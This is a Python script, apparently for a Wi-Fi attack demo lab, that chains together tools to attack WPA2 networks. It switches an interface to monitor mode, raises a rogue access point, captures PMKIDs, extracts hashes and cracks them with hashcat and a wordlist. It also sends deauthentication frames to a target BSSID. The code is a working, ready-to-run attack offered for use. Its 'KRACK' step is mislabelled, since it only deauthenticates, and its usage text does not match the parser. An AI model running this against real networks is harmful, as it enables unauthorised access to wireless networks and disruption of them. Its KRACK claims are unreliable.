#!/usr/bin/env python3
"""
WPA2/KRACK Automator
Permite automatizar la demo de:
  - prepare: pasar la interfaz a modo monitor
  - ap: levantar un AP falso (hostapd + dnsmasq)
  - capture: capturar PMKID con hcxdumptool
  - extract: extraer el hash para Hashcat
  - crack: crakear offline con Hashcat
  - krack: demo KRACK (retransmisión de nonce)
  - all: todo el flujo completo

Uso:
  sudo ./wpa2lab.py prepare [--iface IFACE]
  sudo ./wpa2lab.py ap [--iface IFACE]
  sudo ./wpa2lab.py capture
  sudo ./wpa2lab.py extract
  sudo ./wpa2lab.py crack
  sudo ./wpa2lab.py krack --bssid <BSSID>
  sudo ./wpa2lab.py all --iface IFACE --bssid <BSSID>
"""

import sys
import shutil
import subprocess
import re
import logging
import yaml
import argparse
from pathlib import Path

# ---- RUTAS ----
script_dir    = Path(__file__).resolve().parent
project_root  = script_dir.parent

# ---- CARGA DE CONFIG ----
cfg_file = project_root / "config.yaml"
if not cfg_file.exists():
    print(f"Error: no encuentro config.yaml en {project_root}", file=sys.stderr)
    sys.exit(1)
cfg = yaml.safe_load(cfg_file.read_text()) or {}

# ---- LOGGING ----
log_cfg   = cfg.get("logging", {})
log_file  = project_root / log_cfg.get("file", "logs/wpa2lab.log")
log_level = getattr(logging, log_cfg.get("level", "INFO").upper(), logging.INFO)
logging.basicConfig(
    filename=str(log_file),
    level=log_level,
    format="%(asctime)s %(levelname)s %(message)s"
)
log = logging.getLogger("wpa2lab")

# ---- HELPERS ----
def run(cmd, sudo=False):
    """Ejecuta cmd (lista), opcionalmente con sudo."""
    if sudo:
        cmd = ["sudo"] + cmd
    log.info("Ejecutando: %s", " ".join(cmd))
    subprocess.run(cmd, check=True)

def detect_interfaces():
    """Devuelve (managed, monitor) según 'iw dev'."""
    out = subprocess.check_output(["iw", "dev"]).decode()
    managed = monitor = None
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+)", line)
        if m:
            name = m.group(1)
            if name.endswith("mon"):
                monitor = name
            else:
                managed = name
    return managed, monitor

# ---- SUBCOMANDOS ----

def cmd_prepare(args):
    """Mata gestores y pasa la interfaz a modo monitor."""
    managed_cfg = cfg.get("interfaces", {}).get("managed")
    iface, existing_mon = detect_interfaces()
    iface = args.iface or managed_cfg or iface
    if not iface:
        print("Error: no detecto interfaz gestionada. Usa --iface.", file=sys.stderr)
        sys.exit(1)
    # detiene monitor activo
    if existing_mon:
        run(["airmon-ng", "stop", existing_mon], sudo=True)
    # mata procesos que interfieran
    run(["airmon-ng", "check", "kill"], sudo=True)
    # arranca monitor
    try:
        run(["airmon-ng", "start", iface], sudo=True)
    except subprocess.CalledProcessError:
        print(f"Error: {iface} no soporta modo monitor.", file=sys.stderr)
        sys.exit(1)
    _, new_mon = detect_interfaces()
    print(f"Modo monitor activado en: {new_mon}")

def cmd_ap(args):
    """Levanta el AP falso WPA2 (hostapd + dnsmasq)."""
    managed_cfg = cfg.get("interfaces", {}).get("managed")
    iface, mon = detect_interfaces()
    iface = args.iface or managed_cfg or iface
    if not iface:
        print("Error: no detecto interfaz gestionada. Usa --iface.", file=sys.stderr)
        sys.exit(1)
    # detiene modo monitor si existe
    if mon:
        run(["airmon-ng", "stop", mon], sudo=True)
    # asegura que la gestionada está arriba
    run(["ip", "link", "set", iface, "up"], sudo=True)
    # lanza hostapd
    hapd_conf = project_root / "hostapd/hostapd.conf"
    print(f"Iniciando hostapd con {hapd_conf} ...")
    run(["hostapd", str(hapd_conf)], sudo=True)
    # lanza dnsmasq
    dns_conf = project_root / "dnsmasq/dnsmasq.conf"
    print(f"Iniciando dnsmasq con {dns_conf} ...")
    run(["dnsmasq", "-C", str(dns_conf)], sudo=True)
    print("AP falso levantado (ctrl‑C para salir).")

def cmd_capture(_):
    """Captura PMKID con hcxdumptool."""
    tool = "hcxdumptool"
    if not shutil.which(tool):
        print("Instala hcxdumptool: sudo apt install hcxdumptool", file=sys.stderr)
        sys.exit(1)
    _, mon = detect_interfaces()
    if not mon:
        print("Error: no hay interfaz monitor. Ejecuta 'prepare'.", file=sys.stderr)
        sys.exit(1)
    pcap = project_root / cfg.get("paths", {}).get("pcap", "dump.pcapng")
    print(f"Capturando PMKID en {mon} → {pcap}. Ctrl‑C para parar...")
    # usa -w para escribir pcap
    run([tool, "-i", mon, "-w", str(pcap)], sudo=True)

def cmd_extract(_):
    """Extrae el hash para Hashcat."""
    tool = "hcxpcaptool"
    if not shutil.which(tool):
        print("Instala hcxtools: sudo apt install hcxtools", file=sys.stderr)
        sys.exit(1)
    pcap  = project_root / cfg.get("paths", {}).get("pcap", "dump.pcapng")
    hashf = project_root / cfg.get("paths", {}).get("hash", "hash.22000")
    print(f"Extrayendo hash de {pcap} → {hashf} ...")
    run([tool, "-z", str(hashf), str(pcap)])
    print("Hash extraído.")

def cmd_crack(_):
    """Crakea offline con Hashcat."""
    tool = "hashcat"
    if not shutil.which(tool):
        print("Instala hashcat: sudo apt install hashcat", file=sys.stderr)
        sys.exit(1)
    hashf = project_root / cfg.get("paths", {}).get("hash", "hash.22000")
    wordl = cfg.get("paths", {}).get("wordlist", "/usr/share/wordlists/rockyou.txt")
    print("Iniciando cracking offline con Hashcat...")
    run([tool, "-m", "22000", str(hashf), str(wordl)])
    print("Cracking terminado.")

def cmd_krack(args):
    """Demo KRACK, fuerza retransmisión del nonce."""
    tool = "aireplay-ng"
    if not shutil.which(tool):
        print("Instala aircrack-ng: sudo apt install aircrack-ng", file=sys.stderr)
        sys.exit(1)
    _, mon = detect_interfaces()
    if not mon:
        print("Error: no hay interfaz monitor. Ejecuta 'prepare'.", file=sys.stderr)
        sys.exit(1)
    print(f"Forzando KRACK contra {args.bssid} en {mon} ...")
    run([tool, "--keep-tries", "0", "-0", "1", "-a", args.bssid, mon], sudo=True)

def cmd_all(args):
    """Ejecuta toda la demo en secuencia."""
    cmd_prepare(args)
    cmd_ap(args)
    cmd_capture(args)
    cmd_extract(args)
    cmd_crack(args)
    print("Demo COMPLETA. Para KRACK usa:")
    print("  sudo ./wpa2lab.py krack --bssid <BSSID>")

# ---- PARSER ----
if __name__ == "__main__":
    p = argparse.ArgumentParser("WPA2/KRACK Automator")
    sub = p.add_subparsers(dest="cmd", required=True)

    sp = sub.add_parser("prepare", help="Poner modo monitor")
    sp.add_argument("--iface", help="Interfaz gestionada (eg. wlan0)")
    sp.set_defaults(func=cmd_prepare)

    sp = sub.add_parser("ap", help="Levantar AP falso (hostapd+dnsmasq)")
    sp.add_argument("--iface", help="Interfaz gestionada (eg. wlan0)")
    sp.set_defaults(func=cmd_ap)

    sub.add_parser("capture", help="Capturar PMKID").set_defaults(func=cmd_capture)
    sub.add_parser("extract", help="Extraer hash").set_defaults(func=cmd_extract)
    sub.add_parser("crack", help="Iniciar cracking").set_defaults(func=cmd_crack)

    sp = sub.add_parser("krack", help="Demo KRACK")
    sp.add_argument("bssid", help="BSSID del AP objetivo")
    sp.set_defaults(func=cmd_krack)

    sp = sub.add_parser("all", help="Ejecuta todo el flujo")
    sp.add_argument("--iface", help="Interfaz gestionada (eg. wlan0)")
    sp.add_argument("--bssid", required=True, help="BSSID para KRACK")
    sp.set_defaults(func=cmd_all)

    args = p.parse_args()
    args.func(args)
